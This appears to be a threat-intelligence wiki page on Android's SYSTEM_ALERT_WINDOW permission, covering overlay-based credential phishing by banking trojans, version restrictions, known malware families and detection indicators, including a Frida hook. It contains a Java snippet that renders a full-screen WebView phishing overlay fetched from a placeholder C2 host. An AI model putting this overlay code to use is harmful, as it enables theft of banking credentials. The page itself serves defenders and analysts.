# SYSTEM_ALERT_WINDOW

The foundation of overlay attacks on Android. This permission allows drawing windows on top of all other apps, enabling malware to render fake login screens over legitimate banking applications and capture whatever the user types. It remains the most common credential-stealing technique in Android banking trojans, despite years of platform restrictions. Nearly every major banking trojan since 2016 has relied on this permission at some stage of its operation.

## Technical Details

| Attribute | Value |
|-----------|-------|
| Permission | `android.permission.SYSTEM_ALERT_WINDOW` |
| Protection Level | `signature\|appop\|pre23\|development` |
| Grant Method | Settings > Apps > Special access > Display over other apps |
| Introduced | API 1 |
| Special Permission | Yes (requires explicit user action since API 23) |

Before Android 6.0, this was a normal install-time permission granted automatically. Since API 23, users must manually toggle it per-app in Settings. On Android 6-7, apps could bypass this requirement entirely by using `TYPE_TOAST` windows -- a loophole Google patched in Android 8.0. Between API 23 and 25, Google Play apps that requested this permission were [auto-granted via an intent](https://developer.android.com/reference/android/provider/Settings#ACTION_MANAGE_OVERLAY_PERMISSION), making it trivially easy for Play Store malware to acquire.

## What It Enables

The app can create windows using `WindowManager.addView()` with layout types that render above all other applications:

| Window Type | API Range | Behavior |
|-------------|-----------|----------|
| `TYPE_APPLICATION_OVERLAY` | 26+ | Standard overlay, above apps but below critical system UI |
| `TYPE_PHONE` | 1-25 (deprecated 26) | Pre-Oreo overlay type, drawn above application windows |
| `TYPE_SYSTEM_ALERT` | 1-25 (deprecated 26) | Pre-Oreo overlay type with higher z-order |
| `TYPE_TOAST` | 1-25 (restricted 26) | Exploitable for grantless overlays on Android 6-7 |

Overlays can be configured in three primary ways:

- **Fully opaque**: replaces the visible UI entirely, used for phishing screens that mimic banking app login pages
- **Transparent/passthrough**: invisible layer capturing touch events or routing them to the window beneath (tapjacking)
- **Partial**: covers only specific input fields, buttons, or dialog regions to intercept targeted interactions

### Overlay Injection Code

A minimal overlay injection using `TYPE_APPLICATION_OVERLAY`:

```java
WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);

WindowManager.LayoutParams params = new WindowManager.LayoutParams(
    WindowManager.LayoutParams.MATCH_PARENT,
    WindowManager.LayoutParams.MATCH_PARENT,
    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
        | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
    PixelFormat.TRANSLUCENT
);
params.gravity = Gravity.TOP | Gravity.START;

WebView phishView = new WebView(this);
phishView.loadUrl("https://c2.example.com/injects/com.target.bank.html");
wm.addView(phishView, params);
```

The `FLAG_NOT_FOCUSABLE` flag ensures the overlay does not steal input focus from the underlying app until the user interacts with it. The `WebView` loads an HTML template from the C2 server styled to match the target banking app.

## How Webfakes / Injects Work

Modern banking trojans do not hardcode phishing screens. Instead, they use a dynamic injection system:

1. **Target list download**: after installation, the malware requests a list of target package names from C2
2. **Foreground monitoring**: the malware detects which app is in the foreground using `UsageStatsManager.queryUsageStats()` or accessibility events
3. **Inject retrieval**: when a target app launches, the malware requests the corresponding HTML template ("webfake" or "inject") from C2
4. **Overlay rendering**: the HTML is loaded in a `WebView` overlay that exactly matches the target app's login screen
5. **Credential exfiltration**: form data entered by the user is intercepted via JavaScript bridges or `WebViewClient` callbacks and sent to C2

These inject templates are maintained as HTML/CSS/JS archives on C2 infrastructure, often covering hundreds of banking apps across multiple countries. Threat actors sell inject packs on underground forums, and families like [Cerberus](../../malware/families/cerberus.md) and [Ermac](../../malware/families/ermac.md) popularized the model of operators providing inject updates as part of a MaaS subscription.

## Abuse in Malware

### Credential Phishing (Overlay Attack)

The core attack pattern has remained consistent since [BankBot](../../malware/families/bankbot.md) pioneered it around 2016:

1. Malware monitors the foreground app via `UsageStatsManager` or accessibility service
2. When a target banking app opens, malware draws a fake login screen on top
3. The user enters credentials into the overlay, believing it is the real app
4. Malware sends captured credentials to C2

### Tapjacking

A transparent overlay intercepts touch events, or an overlay briefly appears to trick the user into tapping a specific location on a dialog behind it -- for example, a permission grant dialog or an accessibility service enable toggle.

### UI Blocking

A full-screen overlay prevents the user from navigating to Settings to uninstall the malware or revoke permissions. Some families display ransom messages or fake "system update" screens using this technique.

### Notable Families

| Family | Overlay Usage | Source |
|--------|--------------|--------|
| [BankBot](../../malware/families/bankbot.md) | Pioneered overlay-based credential theft on Android | [ThreatFabric](https://www.threatfabric.com/blogs/the-rage-of-android-banking-trojans) |
| [Anubis](../../malware/families/anubis.md) | Overlay combined with keylogger for redundant capture | [ThreatFabric](https://www.threatfabric.com/blogs/the-rage-of-android-banking-trojans) |
| [Cerberus](../../malware/families/cerberus.md) | HTML injection overlays for 200+ banking apps, source leaked in 2020 spawning multiple forks | [ThreatFabric](https://www.threatfabric.com/blogs/cerberus-a-new-banking-trojan-from-the-underworld) |
| [Ermac](../../malware/families/ermac.md) | Cerberus-derived overlay kit targeting 450+ financial and social media apps | [Intel 471](https://www.intel471.com/blog/rmac-2-0-perfecting-the-art-of-account-takeover) |
| [Hydra](../../malware/families/hydra.md) | WebView injection overlays with MaaS distribution model | [ThreatFabric](https://www.threatfabric.com/blogs/the-rage-of-android-banking-trojans) |
| [TsarBot](../../malware/families/tsarbot.md) | Overlay attacks targeting 750+ banking and crypto apps across multiple regions | [Cyble](https://cyble.com/blog/tsarbot-using-overlay-attacks-targeting-bfsi-sector/) |
| [Antidot](../../malware/families/antidot.md) | Multilingual overlay phishing templates (German, French, Spanish, Russian, Portuguese, Romanian, English) | [Cyble](https://cyble.com/blog/new-antidot-android-banking-trojan-masquerading-as-google-play-updates/) |
| [Brokewell](../../malware/families/brokewell.md) | Overlay credential capture paired with cookie theft via WebView session dumping | [ThreatFabric](https://www.threatfabric.com/blogs/brokewell-do-not-go-broke-by-new-banking-malware) |
| [Klopatra](../../malware/families/klopatra.md) | Dynamic overlays for credential theft with hidden VNC for on-device fraud | [Cleafy](https://www.cleafy.com/cleafy-labs/) |
| [Albiriox](../../malware/families/albiriox.md) | VNC remote access combined with overlay attacks, MaaS at $650-720/month | [Cleafy](https://www.cleafy.com/cleafy-labs/albiriox-rat-mobile-malware-targeting-global-finance-and-crypto-wallets) |
| [Herodotus](../../malware/families/herodotus.md) | WebView overlay injection with human-like typing to evade anti-fraud | [ThreatFabric](https://www.threatfabric.com/blogs/new-android-malware-herodotus-mimics-human-behaviour-to-evade-detection) |
| [BingoMod](../../malware/families/bingomod.md) | Overlay phishing combined with VNC-based on-device fraud, wipes device post-theft | [Cleafy](https://www.cleafy.com/cleafy-labs/bingomod-the-new-android-rat-that-steals-money-and-wipes-data) |
| [Crocodilus](../../malware/families/crocodilus.md) | Overlay-driven credential theft with black screen overlay hiding remote actions | [ThreatFabric](https://www.threatfabric.com/blogs/exposing-crocodilus-new-device-takeover-malware-targeting-android-devices) |
| [BTMOB RAT](../../malware/families/btmob.md) | Web injection overlays paired with screen sharing, evolved from SpySolr | [Cyble](https://cyble.com/blog/btmob-rat-newly-discovered-android-malware/) |

## Android Version Changes

### Android 6.0 (API 23)

Moved `SYSTEM_ALERT_WINDOW` from install-time to a special permission requiring user action. Google Play apps could auto-grant the permission via `ACTION_MANAGE_OVERLAY_PERMISSION` intent until Android 8. This was intended to reduce abuse but created a gap where Play Store-distributed malware could still acquire it easily.

### Android 7.1 (API 25)

`TYPE_TOAST` windows remained usable without the permission, providing a bypass path. Malware exploited this to display overlays without any user interaction.

### Android 8.0 (API 26)

Major changes: `TYPE_TOAST` exploit patched. Deprecated `TYPE_PHONE`, `TYPE_SYSTEM_ALERT`, and other legacy overlay types. Added `TYPE_APPLICATION_OVERLAY` as the sole legitimate overlay type, which renders below critical system windows like permission dialogs. This partially mitigated tapjacking of permission grants.

### Android 10 (API 29)

Overlays cannot appear on top of other app activities if the overlay app does not have focus. Added restrictions on overlay interactions with other apps' windows.

### Android 12 (API 31)

Significant anti-overlay changes. Overlays with `FLAG_NOT_TOUCHABLE` become untouchable by default -- the system blocks touch passthrough for `TYPE_APPLICATION_OVERLAY` windows. Apps can call `setHideOverlayWindows(true)` on their activities to [prevent non-system overlays from appearing](https://developer.android.com/about/versions/12/behavior-changes-all) over sensitive UI. System adds `FLAG_WINDOW_IS_PARTIALLY_OBSCURED` to MotionEvents when an overlay is present, allowing target apps to detect and reject obscured touches.

### Post-Android 12: The Shift to Accessibility

The cumulative overlay restrictions in Android 12+ made traditional overlay attacks less reliable. Modern malware families have shifted to using `BIND_ACCESSIBILITY_SERVICE` as the primary attack vector. With accessibility, malware can:

- Perform gestures directly on behalf of the user (no overlay needed)
- Read screen content in real-time
- Intercept and manipulate UI elements
- Auto-grant permissions programmatically

Families like [Crocodilus](../../malware/families/crocodilus.md), [Herodotus](../../malware/families/herodotus.md), and [Albiriox](../../malware/families/albiriox.md) combine accessibility abuse with overlay attacks -- using overlays for credential capture where effective, and accessibility for everything else. See [Accessibility Abuse](../../attacks/accessibility-abuse.md) for the full attack pattern.

## Frida Monitoring Script

Hook `WindowManager.addView()` to detect overlay creation at runtime:

```javascript
Java.perform(function () {
    var WindowManagerImpl = Java.use("android.view.WindowManagerImpl");
    WindowManagerImpl.addView.overload(
        "android.view.View",
        "android.view.ViewGroup$LayoutParams"
    ).implementation = function (view, params) {
        var lp = Java.cast(params, Java.use("android.view.WindowManager$LayoutParams"));
        var type = lp.type.value;
        var flags = lp.flags.value;
        var title = lp.getTitle();
        console.log("[Overlay] addView called");
        console.log("  type: " + type);
        console.log("  flags: 0x" + flags.toString(16));
        console.log("  title: " + title);
        console.log("  view: " + view.getClass().getName());
        if (type === 2038) {
            console.log("  [!] TYPE_APPLICATION_OVERLAY detected");
        }
        this.addView(view, params);
    };
});
```

## Detection Indicators

**Manifest signals:**

```xml
<uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
```

**High-confidence malware indicators** (combination of):

- `SYSTEM_ALERT_WINDOW` + `BIND_ACCESSIBILITY_SERVICE`
- `TYPE_APPLICATION_OVERLAY` usage + `UsageStatsManager.queryUsageStats()` calls (foreground app detection)
- WebView creation inside a service context (inject loading)
- HTML files or URLs referencing banking package names
- `INTERNET` + `RECEIVE_BOOT_COMPLETED` + `FOREGROUND_SERVICE` alongside the overlay permission

**Static analysis targets:**

- Calls to `WindowManager.addView()` with overlay type parameters
- `WebView.loadUrl()` or `WebView.loadData()` inside `Service` classes
- String references to banking package names (`com.chase.sig.android`, `com.bankofamerica.cashpromobile`, etc.)
- JavaScript bridge registration (`addJavascriptInterface`) in overlay WebViews

See also: [Overlay Attacks](../../attacks/overlay-attacks.md) | [Tapjacking](../../attacks/tapjacking.md) | [Accessibility Abuse](../../attacks/accessibility-abuse.md)
